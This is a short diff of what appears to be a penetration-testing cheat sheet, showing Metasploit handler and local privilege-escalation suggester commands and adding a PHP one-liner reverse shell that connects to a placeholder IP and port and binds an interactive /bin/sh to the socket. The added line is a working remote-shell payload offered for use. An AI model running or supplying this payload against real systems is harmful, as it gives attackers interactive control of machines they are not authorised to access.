@@ -73,3 +73,6 @@ msf> use exploit/multi/handler
 
 #privesc metasploit  
 meterpreter > run post/multi/recon/local_exploit_suggester  
+
+#reverse shell php  
+php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'  
